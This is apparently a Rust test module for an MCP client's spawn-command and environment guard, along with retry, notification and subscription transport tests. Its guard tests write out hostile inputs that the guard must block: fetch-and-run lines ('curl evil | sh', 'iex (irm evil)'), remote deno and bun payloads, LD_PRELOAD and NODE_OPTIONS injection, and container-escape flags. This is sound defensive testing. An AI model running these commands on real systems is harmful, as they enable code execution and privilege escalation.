        assert!(screen_spawn_command("npx", &argv(&["-y", "@some/mcp-server"])).is_ok());
        assert!(screen_spawn_command("uvx", &argv(&["some-mcp-server"])).is_ok());
        assert!(screen_spawn_command("node", &argv(&["server.js", "--port", "3000"])).is_ok());
        assert!(screen_spawn_command("python", &argv(&["-m", "my_server"])).is_ok());
        assert!(screen_spawn_command("python3", &argv(&["/opt/app/main.py"])).is_ok());
        // A docker server without escape flags is fine.
        assert!(screen_spawn_command("docker", &argv(&["run", "-i", "--rm", "ghcr.io/x/y"])).is_ok());
        // Non-host docker network must NOT be a false positive.
        assert!(screen_spawn_command("docker", &argv(&["run", "--network", "mynet", "img"])).is_ok());
        // A plain binary server.
        assert!(screen_spawn_command("/usr/local/bin/my-mcp", &argv(&["--stdio"])).is_ok());
    }

    #[test]
    fn spawn_guard_blocks_interpreter_inline_eval() {
        assert!(screen_spawn_command("node", &argv(&["-e", "require('child_process')"])).is_err());
        assert!(screen_spawn_command("node", &argv(&["--eval", "x"])).is_err());
        assert!(screen_spawn_command("node", &argv(&["--require", "./pwn.js", "server.js"])).is_err());
        assert!(screen_spawn_command("node", &argv(&["--import=./pwn.js", "server.js"])).is_err());
        assert!(screen_spawn_command("deno", &argv(&["eval", "-e", "x"])).is_err());
        assert!(screen_spawn_command("python", &argv(&["-c", "import os"])).is_err());
        assert!(screen_spawn_command("ruby", &argv(&["-e", "x"])).is_err());
        assert!(screen_spawn_command("bash", &argv(&["-c", "curl evil | sh"])).is_err());
        assert!(screen_spawn_command("sh", &argv(&["-c", "x"])).is_err());
        assert!(screen_spawn_command("pwsh", &argv(&["-Command", "x"])).is_err());
    }

    #[test]
    fn spawn_guard_blocks_attached_inline_eval() {
        // Scripting interpreters accept the code attached to the flag token, so the
        // whole payload is a single argv entry with no `=` to split on. A bare
        // equality check misses these; the guard must still block them.
        assert!(screen_spawn_command("python", &argv(&["-cimport os;os.system('x')"])).is_err());
        assert!(screen_spawn_command("python3", &argv(&["-cimport os"])).is_err());
        assert!(screen_spawn_command("ruby", &argv(&["-eputs 1"])).is_err());
        assert!(screen_spawn_command("perl", &argv(&["-eprint 1"])).is_err());
        assert!(screen_spawn_command("php", &argv(&["-rphpinfo();"])).is_err());
        // Case-insensitive on the attached form too.
        assert!(screen_spawn_command("PYTHON", &argv(&["-Cimport os"])).is_err());
        // A bare `-c` with the code as the next token stays blocked (regression).
        assert!(screen_spawn_command("python", &argv(&["-c", "import os"])).is_err());
        // Non-eval short flags that merely start with the same letter are still fine.
        assert!(screen_spawn_command("python", &argv(&["-m", "my_server"])).is_ok());
        assert!(screen_spawn_command("my-server", &argv(&["-config.json"])).is_ok());
    }

    #[test]
    fn spawn_guard_blocks_container_escape() {
        // Privilege escalation beyond a normal host process is blocked.
        assert!(screen_spawn_command("docker", &argv(&["run", "--privileged", "img"])).is_err());
        assert!(screen_spawn_command("podman", &argv(&["run", "--cap-add", "SYS_ADMIN", "img"])).is_err());
        assert!(screen_spawn_command("docker", &argv(&["run", "--device", "/dev/kmsg", "img"])).is_err());
        // Host namespaces in both `=host` and space forms.
        assert!(screen_spawn_command("docker", &argv(&["run", "--network=host", "img"])).is_err());
        assert!(screen_spawn_command("docker", &argv(&["run", "--pid", "host", "img"])).is_err());
    }

    #[test]
    fn spawn_guard_allows_docker_volume_mounts() {
        // A plain host mount is NOT an escalation beyond the full host access npx/binary
        // servers already have, so it must not false-positive on legit docker servers.
        assert!(screen_spawn_command("docker", &argv(&["run", "-v", "/data:/data", "img"])).is_ok());
        assert!(screen_spawn_command("docker", &argv(&["run", "--volume", "/data:/data", "img"])).is_ok());
        assert!(screen_spawn_command("docker", &argv(&["run", "--mount", "type=bind,src=/data,dst=/d", "img"])).is_ok());
    }

    #[test]
    fn spawn_guard_is_case_and_path_insensitive() {
        // A full path and odd casing must still resolve to the interpreter name.
        assert!(screen_spawn_command("/usr/bin/node", &argv(&["-e", "x"])).is_err());
        assert!(screen_spawn_command("C:\\Program Files\\nodejs\\NODE.EXE", &argv(&["-E", "x"])).is_err());
        // A non-interpreter that merely has a `-e`-looking arg is untouched.
        assert!(screen_spawn_command("my-server", &argv(&["-e", "value"])).is_ok());
    }

    #[test]
    fn spawn_guard_rejects_wrapper_commands() {
        // Wrapper programs run the REAL command from their args, which would bypass the
        // basename dispatch. Refused outright, in any path form.
        for w in [
            "sudo", "doas", "su", "runuser", "pkexec", "time", "nice", "nohup", "xargs",
            "stdbuf", "timeout", "flock", "busybox", "proxychains", "chroot", "capsh",
            "firejail", "wine",
        ] {
            assert!(
                screen_spawn_command(w, &argv(&["node", "-e", "evil()"])).is_err(),
                "{w} wrapper should be refused"
            );
        }
    }

    #[test]
    fn spawn_guard_blocks_getopt_flag_clustering() {
        // The eval flag packed behind benign boolean flags in one getopt cluster is a real
        // inline-eval and must be blocked (`sh -ec`, `python -Ec`, `ruby/perl -we`, node -pe).
        assert!(screen_spawn_command("sh", &argv(&["-ec", "curl https://x | sh"])).is_err());
        assert!(screen_spawn_command("bash", &argv(&["-xec", "id"])).is_err());
        assert!(screen_spawn_command("python", &argv(&["-Ec", "import os"])).is_err());
        assert!(screen_spawn_command("python3", &argv(&["-Ec", "x"])).is_err());
        assert!(screen_spawn_command("ruby", &argv(&["-we", "system('x')"])).is_err());
        assert!(screen_spawn_command("perl", &argv(&["-we", "system('x')"])).is_err());
        assert!(screen_spawn_command("node", &argv(&["-pe", "process.exit()"])).is_err());
        // Value-taking flags swallow the rest of the token and must NOT be read as an eval
        // (no false positives on real invocations).
        assert!(screen_spawn_command("python", &argv(&["-mhttp.server"])).is_ok());
        assert!(screen_spawn_command("python", &argv(&["-Wignore::DeprecationWarning", "a.py"])).is_ok());
        assert!(screen_spawn_command("bash", &argv(&["-o", "pipefail", "script.sh"])).is_ok());
        assert!(screen_spawn_command("ruby", &argv(&["-Ilib", "app.rb"])).is_ok());
        assert!(screen_spawn_command("perl", &argv(&["-Ilib", "app.pl"])).is_ok());
        // Plain non-clustered invocations still classify correctly.
        assert!(screen_spawn_command("python", &argv(&["-c", "x"])).is_err());
        assert!(screen_spawn_command("python", &argv(&["server.py"])).is_ok());
        assert!(screen_spawn_command("bash", &argv(&["script.sh"])).is_ok());
    }

    #[test]
    fn spawn_guard_closes_deno_bun_basename_and_env_bypasses() {
        // deno/bun: a value-taking flag before the subcommand can't hide a remote fetch-exec.
        assert!(screen_spawn_command("deno", &argv(&["--config", "d.json", "run", "npm:evil"])).is_err());
        assert!(screen_spawn_command("deno", &argv(&["run", "https://evil.ts"])).is_err());
        assert!(screen_spawn_command("deno", &argv(&["run", "data:text/javascript,alert(1)"])).is_err());
        assert!(screen_spawn_command("bun", &argv(&["--cwd", "/x", "run", "https://evil"])).is_err());
        // A local deno run stays allowed.
        assert!(screen_spawn_command("deno", &argv(&["run", "./server.ts"])).is_ok());
        // Multi-dot / versioned interpreter names still dispatch to the interpreter family.
        assert!(screen_spawn_command("python3.10", &argv(&["-c", "x"])).is_err());
        assert!(screen_spawn_command("C:\\py\\python3.11.exe", &argv(&["-c", "x"])).is_err());
        // New wrappers and qemu-* user-mode emulators are refused.
        assert!(screen_spawn_command("strace", &argv(&["node", "-e", "x"])).is_err());
        assert!(screen_spawn_command("bwrap", &argv(&["python", "-c", "x"])).is_err());
        assert!(screen_spawn_command("qemu-x86_64", &argv(&["/bin/node", "-e", "x"])).is_err());
        // New always-blocked env vars; a benign var stays fine.
        assert!(screen_spawn_env(&[("ZDOTDIR".into(), "/tmp/evil".into())]).is_err());
        assert!(screen_spawn_env(&[("GCONV_PATH".into(), "/tmp/evil".into())]).is_err());
        assert!(screen_spawn_env(&[("NODE_ENV".into(), "production".into())]).is_ok());
    }

    #[test]
    fn spawn_guard_review_followups() {
        // Windows py/pyw launchers forward -c and version selectors to python.
        assert!(screen_spawn_command("py", &argv(&["-c", "import os"])).is_err());
        assert!(screen_spawn_command("pyw", &argv(&["-c", "x"])).is_err());
        assert!(screen_spawn_command("py", &argv(&["-3.11", "-c", "x"])).is_err());
        assert!(screen_spawn_command("py", &argv(&["-3.11", "script.py"])).is_ok());
        // A global value option can't hide the deno eval subcommand.
        assert!(screen_spawn_command("deno", &argv(&["--config", "d.json", "eval", "Deno.exit()"])).is_err());
        assert!(screen_spawn_command("deno", &argv(&["--config", "d.json", "run", "npm:evil"])).is_err());
        // Only the executable target is remote-checked; a URL passed as an app arg is fine.
        assert!(screen_spawn_command("deno", &argv(&["run", "./server.ts", "--url", "https://api.example.com"])).is_ok());
        assert!(screen_spawn_command("bun", &argv(&["run", "server.ts", "--url", "https://api.example.com"])).is_ok());
        // `--` ends interpreter options, so a cluster-shaped APP arg after it isn't screened.
        assert!(screen_spawn_command("python", &argv(&["server.py", "--", "-Ec"])).is_ok());
    }

    #[test]
    fn spawn_guard_env_wrapper_screens_inner_command_and_assignments() {
        // The common `env VAR=val <cmd>` pattern is allowed, with the real command screened.
        assert!(screen_spawn_command("env", &argv(&["FOO=bar", "node", "server.js"])).is_ok());
        assert!(screen_spawn_command("/usr/bin/env", &argv(&["A=1", "python", "main.py"])).is_ok());
        // ...but a dangerous inner command is still caught through env.
        assert!(screen_spawn_command("env", &argv(&["FOO=bar", "node", "-e", "evil()"])).is_err());
        assert!(screen_spawn_command("env", &argv(&["python", "-c", "x"])).is_err());
        // ...and a code-injecting assignment is caught (screened like the env field).
        assert!(screen_spawn_command("env", &argv(&["LD_PRELOAD=/tmp/pwn.so", "node", "s.js"])).is_err());
        // env with its own flags is unusual and fails closed.
        assert!(screen_spawn_command("env", &argv(&["-S", "node -e evil()"])).is_err());
        assert!(screen_spawn_command("env", &argv(&["-u", "PATH", "node", "-e", "x"])).is_err());
    }

    #[test]
    fn spawn_guard_blocks_deno_bun_remote_and_awk() {
        // Deno/Bun remote specifiers (registry + serve), beyond plain http(s).
        assert!(screen_spawn_command("deno", &argv(&["run", "-A", "npm:@evil/rce"])).is_err());
        assert!(screen_spawn_command("deno", &argv(&["run", "jsr:@evil/pkg"])).is_err());
        assert!(screen_spawn_command("deno", &argv(&["serve", "https://evil.host/x.ts"])).is_err());
        assert!(screen_spawn_command("bun", &argv(&["run", "https://evil.host/x.ts"])).is_err());
        // Local/registry-package normal usage still passes.
        assert!(screen_spawn_command("deno", &argv(&["run", "-A", "./server.ts"])).is_ok());
        assert!(screen_spawn_command("bun", &argv(&["run", "start"])).is_ok());
        // awk inline program (no -f) is code; `awk -f script.awk` is a file and allowed.
        assert!(screen_spawn_command("awk", &argv(&["BEGIN{system(\"x\")}"])).is_err());
        assert!(screen_spawn_command("gawk", &argv(&["-e", "BEGIN{system(\"x\")}"])).is_err());
        assert!(screen_spawn_command("awk", &argv(&["-f", "script.awk", "data.txt"])).is_ok());
        // php begin-code.
        assert!(screen_spawn_command("php", &argv(&["-B", "system('x');", "-R", "0"])).is_err());
    }

    #[test]
    fn spawn_guard_blocks_more_interpreters_and_shells() {
        assert!(screen_spawn_command("osascript", &argv(&["-e", "do shell script \"x\""])).is_err());
        assert!(screen_spawn_command("elixir", &argv(&["-e", "System.cmd(0,0)"])).is_err());
        assert!(screen_spawn_command("lua", &argv(&["-e", "os.execute('x')"])).is_err());
        assert!(screen_spawn_command("Rscript", &argv(&["-e", "system('x')"])).is_err());
        assert!(screen_spawn_command("julia", &argv(&["-e", "run(`x`)"])).is_err());
        // Windows `cmd /c` / `/k` was previously unscreened (only pwsh was listed).
        assert!(screen_spawn_command("cmd", &argv(&["/c", "evil.bat"])).is_err());
        assert!(screen_spawn_command("cmd.exe", &argv(&["/k", "evil"])).is_err());
        // Running a real script file is fine.
        assert!(screen_spawn_command("lua", &argv(&["server.lua"])).is_ok());
        assert!(screen_spawn_command("Rscript", &argv(&["app.R"])).is_ok());
    }

    #[test]
    fn spawn_guard_blocks_powershell_encoded_and_abbreviated() {
        // -EncodedCommand (base64) and its -e/-ec/-enc aliases run arbitrary code.
        assert!(screen_spawn_command("pwsh", &argv(&["-EncodedCommand", "ZWNobyBw"])).is_err());
        assert!(screen_spawn_command("powershell", &argv(&["-enc", "ZWNobyBw"])).is_err());
        assert!(screen_spawn_command("pwsh", &argv(&["-e", "ZWNobyBw"])).is_err());
        assert!(screen_spawn_command("pwsh", &argv(&["-ec", "ZWNobyBw"])).is_err());
        assert!(screen_spawn_command("pwsh", &argv(&["-EncodedCommand:ZWNobw"])).is_err());
        // Any abbreviation of -Command runs a command line.
        assert!(screen_spawn_command("pwsh", &argv(&["-com", "iex (irm evil)"])).is_err());
        assert!(screen_spawn_command("pwsh.exe", &argv(&["-c", "iex (irm evil)"])).is_err());
        // A real script and benign switches are allowed (no over-blocking).
        assert!(screen_spawn_command("pwsh", &argv(&["-File", "server.ps1"])).is_ok());
        assert!(screen_spawn_command("pwsh", &argv(&["-NoProfile", "-File", "server.ps1"])).is_ok());
        assert!(screen_spawn_command(
            "pwsh",
            &argv(&["-ExecutionPolicy", "Bypass", "-File", "s.ps1"])
        )
        .is_ok());
    }

    #[test]
    fn spawn_guard_blocks_deno_eval_and_remote_run() {
        // Deno's lethal invocations are SUBCOMMANDS, not flags.
        assert!(screen_spawn_command("deno", &argv(&["eval", "Deno.exit()"])).is_err());
        assert!(screen_spawn_command("deno", &argv(&["run", "-A", "https://evil.host/x.ts"])).is_err());
        // A normal local `deno run` is allowed.
        assert!(screen_spawn_command("deno", &argv(&["run", "-A", "./server.ts"])).is_ok());
    }

    #[test]
    fn spawn_guard_blocks_node_attached_require() {
        // `-r<module>` attached (no `=`) previously slipped the equality check.
        assert!(screen_spawn_command("node", &argv(&["-r./pwn.js", "server.js"])).is_err());
        assert!(screen_spawn_command("node", &argv(&["--loader", "./pwn.mjs", "server.js"])).is_err());
        assert!(screen_spawn_command("node", &argv(&["dist/server.js"])).is_ok());
    }

    #[test]
    fn spawn_env_blocks_code_injection_vars() {
        let e = |k: &str, v: &str| vec![(k.to_string(), v.to_string())];
        // Always-refused: no benign value.
        assert!(screen_spawn_env(&e("LD_PRELOAD", "/tmp/pwn.so")).is_err());
        assert!(screen_spawn_env(&e("DYLD_INSERT_LIBRARIES", "/tmp/pwn.dylib")).is_err());
        assert!(screen_spawn_env(&e("BASH_ENV", "/tmp/pwn.sh")).is_err());
        // Case-only evasion is defeated (key is uppercased).
        assert!(screen_spawn_env(&e("ld_preload", "/tmp/pwn.so")).is_err());
        // NODE_OPTIONS: preload/eval options refused, benign tuning allowed.
        assert!(screen_spawn_env(&e("NODE_OPTIONS", "--require ./pwn.js")).is_err());
        assert!(screen_spawn_env(&e("NODE_OPTIONS", "--loader=./pwn.mjs")).is_err());
        assert!(screen_spawn_env(&e("NODE_OPTIONS", "--max-old-space-size=4096")).is_ok());
        // RUBYOPT: -r/-e refused, benign tuning (-W0) allowed (no longer all-or-nothing).
        assert!(screen_spawn_env(&e("RUBYOPT", "-rpwn")).is_err());
        assert!(screen_spawn_env(&e("RUBYOPT", "-W0")).is_ok());
        // JVM agent injection refused; benign JVM tuning allowed.
        assert!(screen_spawn_env(&e("JAVA_TOOL_OPTIONS", "-javaagent:/tmp/pwn.jar")).is_err());
        assert!(screen_spawn_env(&e("_JAVA_OPTIONS", "-agentlib:pwn")).is_err());
        assert!(screen_spawn_env(&e("JAVA_TOOL_OPTIONS", "-Xmx512m")).is_ok());
        // Ordinary server config env is fine.
        assert!(screen_spawn_env(&e("API_TOKEN", "sk-123")).is_ok());
        // PERL5OPT: -M/-m module preload and -d debugger run code (refused); benign
        // tuning like -w is allowed.
        assert!(screen_spawn_env(&e("PERL5OPT", "-Mstrict")).is_err());
        assert!(screen_spawn_env(&e("PERL5OPT", "-d:Trace=x")).is_err());
        assert!(screen_spawn_env(&e("PERL5OPT", "-w")).is_ok());
        assert!(screen_spawn_env(&[]).is_ok());
    }

    #[test]
    #[cfg(windows)]
    fn resolves_bare_command_via_pathext() {
        // `cmd` is always on PATH on Windows; it should resolve to a real file.
        let resolved = resolve_command("cmd");
        assert!(
            resolved.to_lowercase().ends_with("cmd.exe"),
            "expected cmd.exe, got {resolved}"
        );
    }

    #[test]
    fn backoff_doubles_and_caps() {
        use super::{backoff_delay, HTTP_RETRY_BASE, HTTP_RETRY_CAP};
        assert_eq!(backoff_delay(0), HTTP_RETRY_BASE);
        assert_eq!(backoff_delay(1), HTTP_RETRY_BASE * 2);
        assert_eq!(backoff_delay(2), HTTP_RETRY_BASE * 4);
        // Large attempts saturate at the cap, never overflow.
        assert_eq!(backoff_delay(30), HTTP_RETRY_CAP);
    }

    #[test]
    fn retry_after_parses_delta_seconds_and_caps() {
        use super::{retry_after_delay, HTTP_RETRY_CAP};
        use std::time::Duration;
        assert_eq!(retry_after_delay("2"), Some(Duration::from_secs(2)));
        assert_eq!(retry_after_delay("  5 "), Some(Duration::from_secs(5)));
        // Over the cap is clamped to the cap.
        assert_eq!(retry_after_delay("9999"), Some(HTTP_RETRY_CAP));
        // HTTP-date form and junk are not delta-seconds: no delay parsed.
        assert_eq!(retry_after_delay("Wed, 21 Oct 2026 07:28:00 GMT"), None);
        assert_eq!(retry_after_delay(""), None);
    }

    #[test]
    fn bearer_header_adds_scheme_once() {
        assert_eq!(super::bearer_header("sk-123"), "Bearer sk-123");
        assert_eq!(super::bearer_header("Bearer sk-123"), "Bearer sk-123");
        assert_eq!(super::bearer_header("bearer sk-123"), "bearer sk-123");
    }

    #[test]
    fn ids_match_tolerates_number_vs_string() {
        use super::ids_match;
        use serde_json::json;
        assert!(ids_match(Some(&json!(1)), Some(&json!(1))));
        // A server that echoes the numeric id as a string still matches.
        assert!(ids_match(Some(&json!("1")), Some(&json!(1))));
        assert!(ids_match(Some(&json!(1)), Some(&json!("1"))));
        assert!(!ids_match(Some(&json!(2)), Some(&json!(1))));
        // No id requested -> take the first message.
        assert!(ids_match(Some(&json!(1)), None));
        // Wanted an id but the message has none -> no match.
        assert!(!ids_match(None, Some(&json!(1))));
    }

    #[test]
    fn recognizes_a_tools_list_changed_notification() {
        use super::is_list_changed;
        assert!(is_list_changed(
            r#"{"jsonrpc":"2.0","method":"notifications/tools/list_changed"}"#
        ));
        assert!(is_list_changed(
            "  {\"jsonrpc\":\"2.0\",\"method\":\"notifications/tools/list_changed\"}\n"
        ));
        // A response to our own tools/list call is not the notification.
        assert!(!is_list_changed(r#"{"jsonrpc":"2.0","id":3,"result":{"tools":[]}}"#));
        // Other notifications and unrelated lines are ignored (and skip the parse).
        assert!(!is_list_changed(
            r#"{"jsonrpc":"2.0","method":"notifications/message","params":{}}"#
        ));
        assert!(!is_list_changed("not json at all"));
        assert!(!is_list_changed(""));
    }

    #[test]
    fn classifies_each_list_changed_kind() {
        use super::{change, list_changed_kind};
        assert_eq!(
            list_changed_kind(r#"{"jsonrpc":"2.0","method":"notifications/tools/list_changed"}"#),
            change::TOOLS
        );
        assert_eq!(
            list_changed_kind(
                r#"{"jsonrpc":"2.0","method":"notifications/resources/list_changed"}"#
            ),
            change::RESOURCES
        );
        assert_eq!(
            list_changed_kind(
                r#"{"jsonrpc":"2.0","method":"notifications/prompts/list_changed"}"#
            ),
            change::PROMPTS
        );
        // resources/updated is a different notification, not a list change.
        assert_eq!(
            list_changed_kind(r#"{"jsonrpc":"2.0","method":"notifications/resources/updated"}"#),
            0
        );
        assert_eq!(list_changed_kind("not json"), 0);
        assert_eq!(list_changed_kind(""), 0);
    }

    #[test]
    fn forward_line_flags_dirty_only_when_armed() {
        use super::{change, forward_line};
        use std::sync::atomic::{AtomicBool, AtomicU8, Ordering};
        use std::sync::Arc;

        let notif = r#"{"jsonrpc":"2.0","method":"notifications/tools/list_changed"}"#;
        let dirty = Some(Arc::new(AtomicU8::new(0)));
        let armed = Arc::new(AtomicBool::new(false));
        let (tx, rx) = std::sync::mpsc::channel();
        let no_sink = None;
        let no_progress = Arc::new(std::sync::Mutex::new(None));

        // Unarmed (still in the handshake window): the line is forwarded but the
        // change is not acted on.
        assert!(forward_line(notif.to_string(), &tx, &dirty, &armed, &no_sink, &no_progress));
        assert_eq!(dirty.as_ref().unwrap().load(Ordering::SeqCst), 0);
        assert_eq!(rx.recv().unwrap(), notif);

        // Armed: the same notification now sets the TOOLS bit.
        armed.store(true, Ordering::SeqCst);
        assert!(forward_line(notif.to_string(), &tx, &dirty, &armed, &no_sink, &no_progress));
        assert_eq!(dirty.as_ref().unwrap().load(Ordering::SeqCst), change::TOOLS);
        assert_eq!(rx.recv().unwrap(), notif);

        // A resources/list_changed sets the RESOURCES bit alongside it (OR, not
        // overwrite), so distinct changes between watcher ticks aren't lost.
        let res_notif = r#"{"jsonrpc":"2.0","method":"notifications/resources/list_changed"}"#;
        assert!(forward_line(res_notif.to_string(), &tx, &dirty, &armed, &no_sink, &no_progress));
        assert_eq!(
            dirty.as_ref().unwrap().load(Ordering::SeqCst),
            change::TOOLS | change::RESOURCES
        );
        assert_eq!(rx.recv().unwrap(), res_notif);

        // An ordinary line is always forwarded and never flags a change.
        let resp = r#"{"jsonrpc":"2.0","id":1,"result":{}}"#;
        let dirty2 = Some(Arc::new(AtomicU8::new(0)));
        assert!(forward_line(resp.to_string(), &tx, &dirty2, &armed, &no_sink, &no_progress));
        assert_eq!(dirty2.as_ref().unwrap().load(Ordering::SeqCst), 0);
        assert_eq!(rx.recv().unwrap(), resp);

        // A closed receiver makes forward_line report "stop".
        drop(rx);
        assert!(!forward_line(notif.to_string(), &tx, &dirty, &armed, &no_sink, &no_progress));
    }

    #[test]
    fn resource_updated_uri_parses_only_updated_notifications() {
        use super::resource_updated_uri;
        assert_eq!(
            resource_updated_uri(
                r#"{"jsonrpc":"2.0","method":"notifications/resources/updated","params":{"uri":"file://a"}}"#
            )
            .as_deref(),
            Some("file://a")
        );
        // list_changed must not be treated as an updated notification.
        assert_eq!(
            resource_updated_uri(
                r#"{"jsonrpc":"2.0","method":"notifications/resources/list_changed"}"#
            ),
            None
        );
        assert_eq!(resource_updated_uri(r#"{"jsonrpc":"2.0","id":1,"result":{}}"#), None);
        assert_eq!(resource_updated_uri("not json"), None);
    }

    #[test]
    fn an_rpc_error_is_not_a_health_failure() {
        // Only unreachability trips the per-server circuit breaker. A server that
        // answers with a JSON-RPC error is alive and well-behaved, and counting it
        // as unhealthy would break a server for every client over one bad call.
        use super::TransportError;
        assert!(!TransportError::Rpc(json!({ "code": -32601 })).is_health_failure());
        assert!(!TransportError::Fatal("HTTP 400".into()).is_health_failure());
        assert!(TransportError::Unavailable("timed out".into()).is_health_failure());
        assert!(TransportError::Retry { retry_after: None, message: "429".into() }
            .is_health_failure());
    }

    #[test]
    fn notifications_carry_the_connections_protocol_meta() {
        // The request path stamps protocol `_meta`; `notify` has its own copy of
        // that logic and had no coverage, so a modern connection could have sent
        // notifications telling a different story than its requests.
        //
        // Driven through the real `HttpTransport::notify` and read back off the
        // wire, rather than asserting on `merge_protocol_meta` in isolation: the
        // helper being right is not the claim, the frame on the wire is.
        use super::{HttpTransport, Transport, MODERN_PROTOCOL_VERSION};
        use std::sync::{Arc, Mutex};

        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let port = server.server_addr().to_ip().unwrap().port();
        let body = Arc::new(Mutex::new(String::new()));
        let bc = Arc::clone(&body);
        let handle = std::thread::spawn(move || {
            if let Ok(mut req) = server.recv() {
                let mut buf = String::new();
                let _ = req.as_reader().read_to_string(&mut buf);
                *bc.lock().unwrap() = buf;
                let ct =
                    tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"application/json"[..])
                        .unwrap();
                let _ = req.respond(tiny_http::Response::from_string("{}").with_header(ct));
            }
        });

        let url = format!("http://127.0.0.1:{port}/");
        let mut t = HttpTransport::new(&url);
        t.set_protocol_meta(Some(super::protocol_meta_for(MODERN_PROTOCOL_VERSION)));
        t.notify("notifications/cancelled", json!({ "requestId": 1 }))
            .expect("notify should reach the server");
        let _ = handle.join();

        let sent: Value = serde_json::from_str(&body.lock().unwrap()).expect("a JSON frame");
        assert_eq!(sent["method"], "notifications/cancelled");
        assert_eq!(
            sent["params"]["_meta"]["io.modelcontextprotocol/protocolVersion"],
            MODERN_PROTOCOL_VERSION,
            "a modern connection stamps its version on notifications too, got {sent}"
        );
        assert_eq!(sent["params"]["requestId"], 1, "the caller's params survive");
    }

    #[test]
    fn modern_http_listener_routes_tagged_notifications() {
        use super::{change, HttpTransport, SubscriptionFilter, Transport, MODERN_PROTOCOL_VERSION};
        use std::sync::atomic::{AtomicU8, Ordering};
        use std::sync::{Arc, Mutex};

        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let port = server.server_addr().to_ip().unwrap().port();
        let body = Arc::new(Mutex::new(String::new()));
        let captured = Arc::clone(&body);
        let handle = std::thread::spawn(move || {
            let mut request = server.recv().unwrap();
            let mut request_body = String::new();
            request.as_reader().read_to_string(&mut request_body).unwrap();
            *captured.lock().unwrap() = request_body;
            let subscription = json!({
                "io.modelcontextprotocol/subscriptionId": 1
            });
            let stream = format!(
                "data: {}\n\ndata: {}\n\ndata: {}\n\n",
                json!({
                    "jsonrpc": "2.0",
                    "method": "notifications/subscriptions/acknowledged",
                    "params": { "_meta": subscription }
                }),
                json!({
                    "jsonrpc": "2.0",
                    "method": "notifications/tools/list_changed",
                    "params": { "_meta": subscription }
                }),
                json!({
                    "jsonrpc": "2.0",
                    "method": "notifications/resources/updated",
                    "params": { "uri": "fixture://one", "_meta": subscription }
                })
            );
            let content_type = tiny_http::Header::from_bytes(
                &b"Content-Type"[..],
                &b"text/event-stream"[..],
            )
            .unwrap();
            request
                .respond(tiny_http::Response::from_string(stream).with_header(content_type))
                .unwrap();
        });

        let dirty = Arc::new(AtomicU8::new(0));
        let updates = Arc::new(Mutex::new(Vec::new()));
        let update_target = Arc::clone(&updates);
        let mut transport = HttpTransport::new(&format!("http://127.0.0.1:{port}/"));
        transport.set_protocol_meta(Some(super::protocol_meta_for(MODERN_PROTOCOL_VERSION)));
        transport.set_change_sink(Some(Arc::clone(&dirty)));
        transport.set_resource_updated_sink(Some(Arc::new(move |uri| {
            update_target.lock().unwrap().push(uri);
        })));
        transport
            .set_subscription_listener(SubscriptionFilter {
                tools_list_changed: true,
                resources_list_changed: true,
                resource_subscriptions: vec!["fixture://one".to_string()],
                ..SubscriptionFilter::default()
            })
            .unwrap();
        handle.join().unwrap();
        for _ in 0..100 {
            if dirty.load(Ordering::SeqCst) == change::TOOLS
                && !updates.lock().unwrap().is_empty()
            {
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(10));
        }
        assert_eq!(dirty.load(Ordering::SeqCst), change::TOOLS);
        assert_eq!(&*updates.lock().unwrap(), &["fixture://one".to_string()]);
        let sent: Value = serde_json::from_str(&body.lock().unwrap()).unwrap();
        assert_eq!(sent["method"], "subscriptions/listen");
        assert_eq!(
            sent["params"]["notifications"]["resourceSubscriptions"][0],
            "fixture://one"
        );
    }

    #[test]
    fn modern_http_listener_steps_up_scope_and_retries() {
        use super::{
            HttpTransport, ScopeReauthorizeFn, SubscriptionFilter, Transport,
            MODERN_PROTOCOL_VERSION,
        };
        use std::sync::{Arc, Mutex};

        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let port = server.server_addr().to_ip().unwrap().port();
        let seen_auth = Arc::new(Mutex::new(Vec::new()));
        let captured_auth = Arc::clone(&seen_auth);
        let handle = std::thread::spawn(move || {
            for hit in 0..2 {
                let request = server
                    .recv_timeout(std::time::Duration::from_secs(2))
                    .unwrap()
                    .expect("subscription listen request");
                captured_auth.lock().unwrap().push(
                    request
                        .headers()
                        .iter()
                        .find(|header| header.field.equiv("Authorization"))
                        .map(|header| header.value.as_str().to_string())
                        .unwrap_or_default(),
                );
                let response = if hit == 0 {
                    tiny_http::Response::from_string("more access required")
                        .with_status_code(403)
                        .with_header(
                            tiny_http::Header::from_bytes(
                                b"WWW-Authenticate",
                                b"Bearer error=\"insufficient_scope\", scope=\" files:write files:read files:write \"",
                            )
                            .unwrap(),
                        )
                } else {
                    tiny_http::Response::from_string(format!(
                        "data: {}\n\n",
                        json!({
                            "jsonrpc": "2.0",
                            "method": "notifications/subscriptions/acknowledged",
                            "params": {
                                "_meta": { "io.modelcontextprotocol/subscriptionId": 1 }
                            }
                        })
                    ))
                    .with_header(
                        tiny_http::Header::from_bytes(b"Content-Type", b"text/event-stream")
                            .unwrap(),
                    )
                };
                request.respond(response).unwrap();
            }
        });

        let challenged_scope = Arc::new(Mutex::new(String::new()));
        let captured_scope = Arc::clone(&challenged_scope);
        let reauthorize: Option<ScopeReauthorizeFn> = Some(Box::new(move |scope| {
            *captured_scope.lock().unwrap() = scope.to_string();
            Ok("step-up-token".to_string())
        }));
        let mut transport = HttpTransport::with_auth_refresh(
            &format!("http://127.0.0.1:{port}/"),
            Some("old-token".to_string()),
            None,
        );
        transport.set_protocol_meta(Some(super::protocol_meta_for(MODERN_PROTOCOL_VERSION)));
        transport.set_scope_reauthorize(reauthorize);
        transport
            .set_subscription_listener(SubscriptionFilter::default())
            .unwrap();
        handle.join().unwrap();
        drop(transport);

        assert_eq!(
            seen_auth.lock().unwrap().as_slice(),
            &["Bearer old-token".to_string(), "Bearer step-up-token".to_string()]
        );
        assert_eq!(
            challenged_scope.lock().unwrap().as_str(),
            "files:read files:write"
        );
    }

    #[test]
    fn modern_resource_subscriptions_replace_the_listener_filter() {
        use super::{DownstreamServer, SubscriptionFilter, Transport, TransportError};
        use std::sync::{Arc, Mutex};

        struct ModernProbe {
            requests: Arc<Mutex<Vec<String>>>,
            filters: Arc<Mutex<Vec<SubscriptionFilter>>>,
        }
        impl Transport for ModernProbe {
            fn request(&mut self, method: &str, _params: Value) -> Result<Value, TransportError> {
                self.requests.lock().unwrap().push(method.to_string());
                match method {
                    "initialize" => Err(TransportError::Rpc(json!({
                        "code": -32601,
                        "message": "method not found"
                    }))),
